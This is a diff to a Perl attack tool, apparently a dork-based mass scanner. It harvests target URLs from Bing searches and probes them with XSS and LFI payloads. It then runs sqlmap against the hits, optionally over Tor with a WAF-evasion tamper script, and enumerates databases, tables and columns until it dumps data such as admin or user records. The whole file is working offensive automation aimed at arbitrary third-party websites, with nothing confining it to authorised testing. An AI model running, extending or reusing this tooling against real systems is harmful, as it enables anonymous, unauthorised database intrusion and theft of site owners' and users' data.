@@ -409,18 +409,19 @@ if($task eq "1"){
   $listcheck = "Search_Scan.txt";
   if (-e $listcheck){ unlink 'Search_Scan.txt'};
   
+  dork:;
   print color 'bold yellow';
-  print "    [+] Please enter your Dork: ";
+  print "    [+] Please enter your Dork [Ex:cart.php?id=]: ";
   print color 'yellow', RESET;
-  chomp ($dork=<STDIN>);
-  
-  if (!$dork){ 
+  $dork=<STDIN>;
+  chomp ($dork);  
+  if (!$dork){
     print color 'red';
 	print "    [+] Uppss.. you have to set a value!\n";
     print color 'yellow', RESET;
 	goto dork;
   };
- 
+
   nresult:;
   print color 'bold yellow';
   print "    [+] Number of page results to print: ";
@@ -442,7 +443,7 @@ if($task eq "1"){
     my $s_results=$1;
     my @scanlist=&scan($s_results);
     sub scan(){
-      my @SEARCH;
+      my @search;
       for($npages=1;$npages<=$nresult;$npages+=1){
         my $google=("http://www.bing.com/search?q=".$s_results."&first=".$npages);
 		my $ua = LWP::UserAgent->new;
@@ -462,433 +463,465 @@ if($task eq "1"){
             close (TEXT);
           }
         }
-      }
-    }
-  }
-  print color 'red';
-  print "    [!] SCAN FINISHED!\n";
-  print color 'red', RESET;
-  
- ###################################################### 
- ###################################################### 
- ###################################################### 
- 
-  SCANRESULTSOPTIONS:;
-  print color 'bold magenta';
-  print "    [+] OPTIONS\n";
-  print color 'magenta', RESET;
-  print "    ::::::::::::::::::::::::::::::::::::::";
-  print "\n    [+] 1 = XSS";
-  print "\n    [+] 2 = LFI";
-  print "\n    [+] 3 = BACK";
-  print "\n    [+] 0 = EXIT (->)";
-  print "\n    ::::::::::::::::::::::::::::::::::::::";
-
-  print color 'bold yellow';
-  print "\n    [+] Please select an option: ";
-  print color 'yellow', RESET;
-  $option=<STDIN>;
- 
-  chomp ($option);
-  if ($option eq "1") {
-    $listcheck2 = "XSS_Search_Scan.txt";
-    if (-e $listcheck2){ unlink 'XSS_Search_Scan.txt'};
+      } 
+    } 
 	
-    print color 'yellow';
-    print "    [+] Please wait...\n";
-    print color 'yellow', RESET;
-	
-    open (TEXT, 'Search_Scan.txt');
-	while (my $Target = <TEXT>) {
-	  chomp $Target;
-	  if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-	  foreach $XSS(@XSS){
-        my $URL = $Target.$XSS;
-        $request = HTTP::Request->new('GET', $URL);
-        $response = $ua->request($request);
-        my $html = $response->content;
-	    if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
-	       print color 'bold green';
-           print "    [+] $URL\n";		   
-	       print color 'green', RESET;
-		   
-		   open (INFO, '>>XSS_Search_Scan.txt');
-           print INFO "$Target\n";
-		   close (INFO);
-	    } 
-      }
-    }
-    $list = "XSS_Search_Scan.txt";
-    if (-e $list){
+    $list = "Search_Scan.txt";
+    if (-e $list){ ## SCAN LIST EXIST
       print" \n";
       print color 'yellow';
-      print "    [+] Scan saved to XSS_Search_Scan.txt\n";
+      print "    [+] Scan saved to Search_Scan.txt\n";
       print color 'yellow', RESET;
-	  
-      ## Add sqlmap option
+      print color 'red';
+      print "    [!] SCAN FINISHED!\n";
+      print color 'red', RESET;
   
-	  EXPLOITVL:;
+ ###################################################### 
+ ###################################################### 
+ ###################################################### 
+
+      SCANRESULTSOPTIONS:;
+      print color 'bold magenta';
+      print "    [+] OPTIONS\n";
+      print color 'magenta', RESET;
+      print "    ::::::::::::::::::::::::::::::::::::::";
+      print "\n    [+] 1 = XSS";
+      print "\n    [+] 2 = LFI";
+      print "\n    [+] 3 = BACK";
+      print "\n    [+] 0 = EXIT (->)";
+      print "\n    ::::::::::::::::::::::::::::::::::::::";
+
       print color 'bold yellow';
-      print "    [+] Do You Want To Exploit Results (sqlmap)? (Y/N): ";
-      print color 'bold yellow', RESET;
-      $sqlmaping=<STDIN>;
-      chomp ($sqlmaping);
-      if (!$sqlmaping){ 
-        print color 'red';
-	    print "    [+] Uppss.. Invalid value!\n";
+      print "\n    [+] Please select an option: ";
+      print color 'yellow', RESET;
+      $option=<STDIN>;
+ 
+      chomp ($option);
+      if ($option eq "1") {
+        $listcheck2 = "XSS_Search_Scan.txt";
+        if (-e $listcheck2){ unlink 'XSS_Search_Scan.txt'};
+	
+        print color 'yellow';
+        print "    [+] Please wait...\n";
         print color 'yellow', RESET;
-	    goto EXPLOITVL;
-      };
-		
-      if ($sqlmaping =~ m/y/i || m/yes/i ){  ### USE SQLMAP
-
-	    USETOR:;
-        print color 'bold yellow';
-        print "    [+] Do You Want To Use Tor? (Y/N): ";
-        print color 'bold yellow', RESET;
-        $usetor=<STDIN>;
-        chomp ($usetor);
-        if (!$usetor){ 
-          print color 'red';
-	      print "    [+] Uppss.. Invalid value!\n";
+	
+        open (TEXT, 'Search_Scan.txt');
+	    while (my $Target = <TEXT>) {
+	      chomp $Target;
+	      if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
+	      foreach $XSS(@XSS){
+            my $URL = $Target.$XSS;
+            $request = HTTP::Request->new('GET', $URL);
+            $response = $ua->request($request);
+            my $html = $response->content;
+	        if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
+	           print color 'bold green';
+               print "    [+] $URL\n";		   
+	           print color 'green', RESET;
+		   
+		       open (INFO, '>>XSS_Search_Scan.txt');
+               print INFO "$Target\n";
+		       close (INFO);
+	        } 
+          }
+        }
+        $list = "XSS_Search_Scan.txt";
+        if (-e $list){
+          print" \n";
+          print color 'yellow';
+          print "    [+] Scan saved to XSS_Search_Scan.txt\n";
           print color 'yellow', RESET;
-	      goto USETOR;
-        };
+	  
+		  #####################
+          ## Add sqlmap option
+		  #####################
+  
+	      EXPLOITVL:;
+          print color 'bold yellow';
+          print "    [+] Do You Want To Exploit Results (sqlmap)? (Y/N): ";
+          print color 'bold yellow', RESET;
+          $sqlmaping=<STDIN>;
+          chomp ($sqlmaping);
+          if (!$sqlmaping){ 
+            print color 'red';
+	        print "    [+] Uppss.. Invalid value!\n";
+            print color 'yellow', RESET;
+	        goto EXPLOITVL;
+          };
+		
+          if ($sqlmaping =~ m/y/i || m/yes/i ){  ### USE SQLMAP
 
-        if ($usetor =~ m/y/i || m/yes/i ){ ### USE TOR
-          open (INFO, 'XSS_Search_Scan.txt');
-	      while (my $Target = <INFO>) {
-	        chomp $Target;
-			
-		    print" \n";
-            print color 'bold';
-            print "    [+] Checking $Target ...";
-            print color RESET;
-		    print" \n";
-            sleep(1);
- 	  
+	        USETOR:;
             print color 'bold yellow';
-            print "    [+] Checking databases...";
+            print "    [+] Do You Want To Use Tor? (Y/N): ";
             print color 'bold yellow', RESET;
-            sleep(1);
-            system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 --tor --check-tor --tor-type=SOCKS5 --dbs --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
-		  
-		    ### BEG DATABASE
-		    DATABASE:; 
-            print color 'bold yellow'; 
-            print "    [+] Do You Want To Exploit DATABASE? (Y/N): ";
-            print color 'bold yellow', RESET;
-            $sqldatabase=<STDIN>;
-            chomp ($sqldatabase);
-            if (!$sqldatabase){ 
+            $usetor=<STDIN>;
+            chomp ($usetor);
+            if (!$usetor){ 
               print color 'red';
 	          print "    [+] Uppss.. Invalid value!\n";
               print color 'yellow', RESET;
-	          goto DATABASE;
+	          goto USETOR;
             };
 
-            if ($sqldatabase =~ m/y/i || m/yes/i ){
-		      DATABASENAME:;
-              print color 'bold yellow';
-              print "    [+] Enter DataBase Name: ";
-              print color 'bold yellow', RESET;
-              $databasename=<STDIN>;
-              chomp ($databasename);
-		      if (!$databasename){ 
-                print color 'red';
-	            print "    [+] Uppss.. you have to Enter DataBase Name!\n";
-                print color 'yellow', RESET;
-	            goto DATABASENAME;
-              };
-		
-              print color 'bold yellow';
-              print "    [+] Checking...";
-              print color 'bold yellow', RESET;
-              sleep(1);
-              system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 --tor --check-tor --tor-type=SOCKS5 -D $databasename --tables --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
-		
-              ### END DATABASE
-		      ### BEG TABLES
-		
-		      TABLESYES:;
-              print color 'bold yellow'; 
-              print "    [+] Do You Want To Exploit Tables? (Y/N): ";
-              print color 'bold yellow', RESET;
-              $sqltableyes=<STDIN>;
-              chomp ($sqltableyes);
-		      if (!$sqltableyes){ 
-                print color 'red';
-	            print "    [+] Uppss.. Invalid value!\n";
-                print color 'yellow', RESET;
-	            goto TABLESYES;
-              };
-
-              if ($sqltableyes =~ m/y/i || m/yes/i ){
-		        TABLES:;
+            if ($usetor =~ m/y/i || m/yes/i ){ ### USE TOR
+              open (INFO, 'XSS_Search_Scan.txt');
+	          while (my $Target = <INFO>) {
+	            chomp $Target;
+			
+		        print" \n";
+                print color 'bold';
+                print "    [+] Checking $Target ...";
+                print color RESET;
+		        print" \n";
+                sleep(1);
+ 	  
                 print color 'bold yellow';
-                print "    [+] Enter Table Name: ";
-                print color 'bold yellow', RESET;
-                $sqltables=<STDIN>;
-                chomp ($sqltables);
-	            if (!$sqltables){ 
-                  print color 'red';
-	              print "    [+] Uppss.. you have to Enter Table Name!\n";
-                  print color 'yellow', RESET;
-	              goto TABLES;
-                };
-		
-                print color 'bold yellow';
-                print "    [+] Checking DataBase Tables...";
+                print "    [+] Checking databases...";
                 print color 'bold yellow', RESET;
                 sleep(1);
-                system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 --tor --check-tor --tor-type=SOCKS5 -D $databasename -T $sqltables --columns --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
-		 
-		        ### END TABLES
-		        ### BEG COLUMNS
-		
-		        COLUMNSYES:;
-                print color 'bold yellow'; 
-                print "    [+] Do You Want To Exploit Columns? (Y/N): ";
-                print color 'bold yellow', RESET;
-                $sqlcolyes=<STDIN>;
-                chomp ($sqlcolyes);
-		
-	            if (!$sqlcolyes){ 
-                  print color 'red';
-	              print "    [+] Uppss.. Invalid Value!\n";
-                  print color 'yellow', RESET;
-	              goto COLUMNSYES;
-                };
-		
-                if ($sqlcolyes =~ m/y/i || m/yes/i ){
-		          COLS:;
-                  print color 'bold yellow';
-                  print "    [+] Enter Column Name [ex: admin,users,orders]: ";
-                  print color 'bold yellow', RESET;
-                  $sqlcolumn=<STDIN>;
-                  chomp ($sqlcolumn);
-	             if (!$sqlcolumn){ 
-                   print color 'red';
-	               print "    [+] Uppss.. you have to Enter Column Name!\n";
-                   print color 'yellow', RESET;
-	               goto COLS;
-                 };
-		
-                 print color 'bold yellow';
-                 print "    [+] Checking Columns...";
-                 print color 'bold yellow', RESET;
-				 sleep(1);
-                 system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 --tor --check-tor --tor-type=SOCKS5 -D $databasename -T $sqltables -C $sqlcolumn --dump --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
-	           }
-		     }
-		    }### END GET LIST
-		  }### END COLUMNS
-        }else{ ### IF NO USE TOR
-	  
-          open (INFO, 'XSS_Search_Scan.txt');
-	      while (my $Target = <INFO>) {  ### GET LIST
-	        chomp $Target;
-			
-		    print" \n";
-            print color 'bold';
-            print "    [+] Checking $Target ...";
-            print color RESET;
-		    print" \n";
-            sleep(1);
-	  
-            print color 'bold yellow';
-            print "    [+] Checking databases...";
-            print color 'bold yellow', RESET;
-            sleep(1);
-            system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 --dbs --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
-		
-		    ### BEG DATABASE
-		    DATABASE:; 
-            print color 'bold yellow'; 
-            print "    [+] Do You Want To Exploit DATABASE? (Y/N): ";
-            print color 'bold yellow', RESET;
-            $sqldatabase=<STDIN>;
-            chomp ($sqldatabase);
-		
-            if (!$sqldatabase){ 
-              print color 'red';
-	          print "    [+] Uppss.. Invalid value!\n";
-              print color 'yellow', RESET;
-	          goto DATABASE;
-            };
-
-            if ($sqldatabase =~ m/y/i || m/yes/i ){
-		      DATABASENAME:;
-              print color 'bold yellow';
-              print "    [+] Enter DataBase Name: ";
-              print color 'bold yellow', RESET;
-              $databasename=<STDIN>;
-              chomp ($databasename);
+                system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 --tor --check-tor --tor-type=SOCKS5 --dbs --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
 		  
-		      if (!$databasename){ 
-                print color 'red';
-	            print "    [+] Uppss.. you have to Enter DataBase Name!\n";
-                print color 'yellow', RESET;
-	            goto DATABASENAME;
-              };
-		
-              print color 'bold yellow';
-              print "    [+] Checking...";
-              print color 'bold yellow', RESET;
-			  sleep(1);
-              system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 -D $databasename --tables --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
-		
-		      ### END DATABASE
-		      ### BEG TABLES
-		
-		      TABLESYES:;
-              print color 'bold yellow'; 
-              print "    [+] Do You Want To Exploit Tables? (Y/N): ";
-              print color 'bold yellow', RESET;
-              $sqltableyes=<STDIN>;
-              chomp ($sqltableyes);
-		      if (!$sqltableyes){ 
-                print color 'red';
-	            print "    [+] Uppss.. Invalid value!\n";
-                print color 'yellow', RESET;
-	            goto TABLESYES;
-              };
-
-              if ($sqltableyes =~ m/y/i || m/yes/i ){
-		        TABLES:;
-                print color 'bold yellow';
-                print "    [+] Enter Table Name: ";
-                print color 'bold yellow', RESET;
-                $sqltables=<STDIN>;
-                chomp ($sqltables);
-	            if (!$sqltables){ 
-                  print color 'red';
-	              print "    [+] Uppss.. you have to Enter Table Name!\n";
-                  print color 'yellow', RESET;
-	              goto TABLES;
-                };
-		
-                print color 'bold yellow';
-                print "    [+] Checking DataBase Tables...";
-                print color 'bold yellow', RESET;
-				sleep(1);
-                system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 -D $databasename -T $sqltables --columns --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
-		
-		        ### END TABLES
-		        ### BEG COLUMNS
-		
-		        COLUMNSYES:;
+		        ### BEG DATABASE
+		        DATABASE:; 
                 print color 'bold yellow'; 
-                print "    [+] Do You Want To Exploit Columns? (Y/N): ";
+                print "    [+] Do You Want To Exploit DATABASE? (Y/N): ";
                 print color 'bold yellow', RESET;
-                $sqlcolyes=<STDIN>;
-                chomp ($sqlcolyes);
-	            if (!$sqlcolyes){ 
+                $sqldatabase=<STDIN>;
+                chomp ($sqldatabase);
+                if (!$sqldatabase){ 
                   print color 'red';
-	              print "    [+] Uppss.. Invalid Value!\n";
+	              print "    [+] Uppss.. Invalid value!\n";
                   print color 'yellow', RESET;
-	             goto COLUMNSYES;
+	              goto DATABASE;
                 };
-		
-                if ($sqlcolyes =~ m/y/i || m/yes/i ){
-		          COLS:;
+
+                if ($sqldatabase =~ m/y/i || m/yes/i ){
+		          DATABASENAME:;
                   print color 'bold yellow';
-                  print "    [+] Enter Column Name [ex: admin,users,orders]: ";
+                  print "    [+] Enter DataBase Name: ";
                   print color 'bold yellow', RESET;
-                  $sqlcolumn=<STDIN>;
-                  chomp ($sqlcolumn);
-	              if (!$sqlcolumn){ 
+                  $databasename=<STDIN>;
+                  chomp ($databasename);
+		          if (!$databasename){ 
                     print color 'red';
-	                print "    [+] Uppss.. you have to Enter Column Name!\n";
+	                print "    [+] Uppss.. you have to Enter DataBase Name!\n";
                     print color 'yellow', RESET;
-	                goto COLS;
+	                goto DATABASENAME;
                   };
 		
                   print color 'bold yellow';
-                  print "    [+] Checking Columns...";
+                  print "    [+] Checking...";
                   print color 'bold yellow', RESET;
-				  sleep(1);
-                  system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 -D $databasename -T $sqltables -C $sqlcolumn --dump --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
-	            } ### END COLUMNS
-		      }
-		    }
-		  }### END GET LIST
-        }  # END NO TOR
-      }else{ ### IF NO SQLMAP 
-	    goto SCANRESULTSOPTIONS;
-	  }
-    }else{
-      print color 'red';
-      print "    [!] No XSS Found!\n";
-	  print color 'red', RESET;
-	}
-    print color 'red';
-    print "    [!] SCAN FINISHED!\n";
-    print color 'red', RESET;
-  }### END OPTION 1
-  #################
-  if ($option eq "2") {
+                  sleep(1);
+		          system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 --tor --check-tor --tor-type=SOCKS5 -D $databasename --tables --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
+		
+		          ### END DATABASE
+		          ### BEG TABLES
+		
+		          TABLESYES:;
+                  print color 'bold yellow'; 
+                  print "    [+] Do You Want To Exploit Tables? (Y/N): ";
+                  print color 'bold yellow', RESET;
+                  $sqltableyes=<STDIN>;
+                  chomp ($sqltableyes);
+		          if (!$sqltableyes){ 
+                    print color 'red';
+	                print "    [+] Uppss.. Invalid value!\n";
+                    print color 'yellow', RESET;
+	                goto TABLESYES;
+		          };
+
+		          if ($sqltableyes =~ m/y/i || m/yes/i ){
+		            TABLES:;
+                    print color 'bold yellow';
+                    print "    [+] Enter Table Name: ";
+                    print color 'bold yellow', RESET;
+                    $sqltables=<STDIN>;
+                    chomp ($sqltables);
+	                if (!$sqltables){ 
+                       print color 'red';
+	                   print "    [+] Uppss.. you have to Enter Table Name!\n";
+                       print color 'yellow', RESET;
+	                   goto TABLES;
+                    };
+		
+		            print color 'bold yellow';
+                    print "    [+] Checking DataBase Tables...";
+                    print color 'bold yellow', RESET;
+                    sleep(1);
+                    system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 --tor --check-tor --tor-type=SOCKS5 -D $databasename -T $sqltables --columns --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
+		 
+                    ### END TABLES
+		            ### BEG COLUMNS
+		
+		            COLUMNSYES:;
+		            print color 'bold yellow'; 
+                    print "    [+] Do You Want To Exploit Columns? (Y/N): ";
+                    print color 'bold yellow', RESET;
+                    $sqlcolyes=<STDIN>;
+                    chomp ($sqlcolyes);
+	                if (!$sqlcolyes){ 
+                      print color 'red';
+	                  print "    [+] Uppss.. Invalid Value!\n";
+                      print color 'yellow', RESET;
+	                  goto COLUMNSYES;
+                    };
+		
+                    if ($sqlcolyes =~ m/y/i || m/yes/i ){
+		              COLS:;
+                      print color 'bold yellow';
+                      print "    [+] Enter Column Name [ex: admin,users,orders]: ";
+                      print color 'bold yellow', RESET;
+                      $sqlcolumn=<STDIN>;
+                      chomp ($sqlcolumn);
+	                  if (!$sqlcolumn){ 
+                        print color 'red';
+	                    print "    [+] Uppss.. you have to Enter Column Name!\n";
+                        print color 'yellow', RESET;
+	                    goto COLS;
+                      };
+		
+                      print color 'bold yellow';
+                      print "    [+] Checking Columns...";
+                      print color 'bold yellow', RESET;
+				      sleep(1);
+                      system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 --tor --check-tor --tor-type=SOCKS5 -D $databasename -T $sqltables -C $sqlcolumn --dump --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
+	                }
+		          }
+		        }
+		      } 
+            }else{ ### IF NO USE TOR
+	  
+              open (INFO, 'XSS_Search_Scan.txt');
+	          while (my $Target = <INFO>) {  ### GET LIST
+	            chomp $Target;
+			
+		        print" \n";
+                print color 'bold';
+                print "    [+] Checking $Target ...";
+                print color RESET;
+		        print" \n";
+                sleep(1);
+	  
+                print color 'bold yellow';
+                print "    [+] Checking databases...";
+                print color 'bold yellow', RESET;
+                sleep(1);
+                system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 --dbs --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
+		
+		        ### BEG DATABASE
+		        DATABASE:; 
+                print color 'bold yellow'; 
+                print "    [+] Do You Want To Exploit DATABASE? (Y/N): ";
+                print color 'bold yellow', RESET;
+                $sqldatabase=<STDIN>;
+                chomp ($sqldatabase);
+		
+                if (!$sqldatabase){ 
+                  print color 'red';
+	              print "    [+] Uppss.. Invalid value!\n";
+                  print color 'yellow', RESET;
+	              goto DATABASE;
+                };
+
+                if ($sqldatabase =~ m/y/i || m/yes/i ){
+		          DATABASENAME:;
+                  print color 'bold yellow';
+                  print "    [+] Enter DataBase Name: ";
+                  print color 'bold yellow', RESET;
+                  $databasename=<STDIN>;
+                  chomp ($databasename);
+		  
+		          if (!$databasename){ 
+                    print color 'red';
+	                print "    [+] Uppss.. you have to Enter DataBase Name!\n";
+                    print color 'yellow', RESET;
+	                goto DATABASENAME;
+                  };
+		
+                  print color 'bold yellow';
+                  print "    [+] Checking...";
+                  print color 'bold yellow', RESET;
+			      sleep(1);
+                  system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 -D $databasename --tables --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
+		
+		          ### END DATABASE
+		          ### BEG TABLES
+		
+		          TABLESYES:;
+                  print color 'bold yellow'; 
+                  print "    [+] Do You Want To Exploit Tables? (Y/N): ";
+                  print color 'bold yellow', RESET;
+                  $sqltableyes=<STDIN>;
+                  chomp ($sqltableyes);
+		          if (!$sqltableyes){ 
+                    print color 'red';
+	                print "    [+] Uppss.. Invalid value!\n";
+                    print color 'yellow', RESET;
+	                goto TABLESYES;
+                  };
+
+		          if ($sqltableyes =~ m/y/i || m/yes/i ){
+		            TABLES:;
+                    print color 'bold yellow';
+                    print "    [+] Enter Table Name: ";
+                    print color 'bold yellow', RESET;
+                    $sqltables=<STDIN>;
+                    chomp ($sqltables);
+	                if (!$sqltables){ 
+                      print color 'red';
+	                  print "    [+] Uppss.. you have to Enter Table Name!\n";
+                      print color 'yellow', RESET;
+	                  goto TABLES;
+                    };
+		
+		            print color 'bold yellow';
+                    print "    [+] Checking DataBase Tables...";
+                    print color 'bold yellow', RESET;
+				    sleep(1);
+                    system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 -D $databasename -T $sqltables --columns --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
+		
+		            ### END TABLES
+		            ### BEG COLUMNS
+		
+		            COLUMNSYES:;
+                    print color 'bold yellow'; 
+                    print "    [+] Do You Want To Exploit Columns? (Y/N): ";
+                    print color 'bold yellow', RESET;
+                    $sqlcolyes=<STDIN>;
+                    chomp ($sqlcolyes);
+	                if (!$sqlcolyes){ 
+                      print color 'red';
+	                  print "    [+] Uppss.. Invalid Value!\n";
+                      print color 'yellow', RESET;
+	                 goto COLUMNSYES;
+                    };
+		
+                    if ($sqlcolyes =~ m/y/i || m/yes/i ){
+		              COLS:;
+                      print color 'bold yellow';
+                      print "    [+] Enter Column Name [ex: admin,users,orders]: ";
+                      print color 'bold yellow', RESET;
+                      $sqlcolumn=<STDIN>;
+                      chomp ($sqlcolumn);
+	                  if (!$sqlcolumn){ 
+                        print color 'red';
+	                    print "    [+] Uppss.. you have to Enter Column Name!\n";
+                        print color 'yellow', RESET;
+	                    goto COLS;
+                      };
+		
+                      print color 'bold yellow';
+                      print "    [+] Checking Columns...";
+                      print color 'bold yellow', RESET;
+				      sleep(1);
+		              system("sqlmap -u $Target --random-agent --beep --level 3 --risk 2 --threads 2 -D $databasename -T $sqltables -C $sqlcolumn --dump --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
+                    } ### END COLUMNS
+		          }
+		        }
+		      }### END GET LIST
+            }  # END NO TOR
+          }else{ ### IF NO SQLMAP 
+	        goto SCANRESULTSOPTIONS;
+	      }
+        }else{
+          print color 'red';
+          print "    [!] No XSS Found!\n";
+	      print color 'red', RESET;
+	    }
+        print color 'red';
+        print "    [!] SCAN FINISHED!\n";
+        print color 'red', RESET;
+      }### END OPTION 1
+	  
+      #################
+      if ($option eq "2") {
    
-    $listcheck2 = "LFI_Search_Scan.txt";
-    if (-e $listcheck2){ unlink 'LFI_Search_Scan.txt'};
+        $listcheck2 = "LFI_Search_Scan.txt";
+        if (-e $listcheck2){ unlink 'LFI_Search_Scan.txt'};
 	
-    print color 'yellow';
-    print "    [+] Please wait...\n";
-    print color 'yellow', RESET;
+        print color 'yellow';
+        print "    [+] Please wait...\n";
+        print color 'yellow', RESET;
 	
-    open (TEXT, 'Search_Scan.txt');
-	while (my $Target = <TEXT>) {
-	  chomp $Target;
-	  if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-	  foreach $LFI(@LFI){
-        my $URL = $Target.$LFI;
-        $request = HTTP::Request->new('GET', $URL);
-        $response = $ua->request($request);
-        my $html = $response->content;
-	    if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
-	       print color 'bold green';
-           print "    [+] $URL\n";		   
-	       print color 'green', RESET;
+        open (TEXT, 'Search_Scan.txt');
+	    while (my $Target = <TEXT>) {
+	      chomp $Target;
+	      if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
+	      foreach $LFI(@LFI){
+            my $URL = $Target.$LFI;
+            $request = HTTP::Request->new('GET', $URL);
+            $response = $ua->request($request);
+            my $html = $response->content;
+	        if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
+	           print color 'bold green';
+               print "    [+] $URL\n";		   
+	           print color 'green', RESET;
 		   
-		   open (INFO, '>>LFI_Search_Scan.txt');
-           print INFO "$URL\n";
-		   close (INFO);
-	    } 
+		       open (INFO, '>>LFI_Search_Scan.txt');
+               print INFO "$URL\n";
+		       close (INFO);
+	        } 
+          }
+        }
+        $list = "LFI_Search_Scan.txt";
+        if (-e $list){
+          print" \n";
+          print color 'yellow';
+          print "    [+] Scan saved to LFI_Search_Scan.txt\n";
+          print color 'yellow', RESET;
+	    }else{
+          print color 'red';
+          print "    [!] No LFI Found!\n";
+	      print color 'red', RESET;
+	    }
+        print color 'red';
+        print "    [!] SCAN FINISHED!\n";
+        print color 'red', RESET;
+      }### END OPTION 
+  
+      #################
+      if ($option eq "3") {
+        exec( $^X, $0, $arg);
+      }
+      #################
+      if ($option eq "0") {
+        print color 'bold red';
+        print "    [!] Have A Good Time! Bye.\n";
+        print color 'bold red', RESET;
+        exit;
+      }
+  
+      if ($option != 0 or 1 or 2 or 3) {
+        print color 'bold red';
+        print "    [!] Upsss.. Invalid Option!\n";
+        print color 'bold red', RESET;
+        goto SCANRESULTSOPTIONS;
+      }
+    }else{
+      print color 'yellow';
+      print "    [+] No Results Found!\n";
+      print color 'yellow', RESET;
+      print color 'red';
+      print "    [!] SCAN FINISHED!\n";
+      print color 'red', RESET;
+	
+      print color 'bold yellow';
+      print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
+      print color 'bold yellow', RESET;
+      $after6=<STDIN>;
+      chomp ($after6);
+      if ($after6==1) {
+        goto dork;
+      }
+      if ($after6==0) {
+        print color 'bold red';
+        print "    [!] Have A Good Time! Bye.\n";
+        print color 'bold red', RESET;
+        exit;
       }
     }
-    $list = "LFI_Search_Scan.txt";
-    if (-e $list){
-      print" \n";
-      print color 'yellow';
-      print "    [+] Scan saved to LFI_Search_Scan.txt\n";
-      print color 'yellow', RESET;
-	}else{
-      print color 'red';
-      print "    [!] No LFI Found!\n";
-	  print color 'red', RESET;
-	}
-    print color 'red';
-    print "    [!] SCAN FINISHED!\n";
-    print color 'red', RESET;
-  }### END OPTION 
-  
-  #################
-  if ($option eq "3") {
-    goto TASKS;
-  }
-  #################
-  if ($option eq "0") {
-    print color 'bold red';
-    print "    [!] Have A Good Time! Bye.\n";
-    print color 'bold red', RESET;
-    exit;
-  }
-  
-  if ($option != 0 or 1 or 2 or 3) {
-    print color 'bold red';
-    print "    [!] Upsss.. Invalid Option!\n";
-    print color 'bold red', RESET;
-    goto SCANRESULTSOPTIONS;
   }
 }
 
@@ -1346,6 +1379,7 @@ if($task eq "2"){
 	if (-e $list){  ### HAHAHA
       print" \n";
 	  print color 'yellow';
+
       print "    [+] Results saved in XSS_Site_Scan.txt! \n";
 	  print color 'yellow', RESET;
       print color 'red';
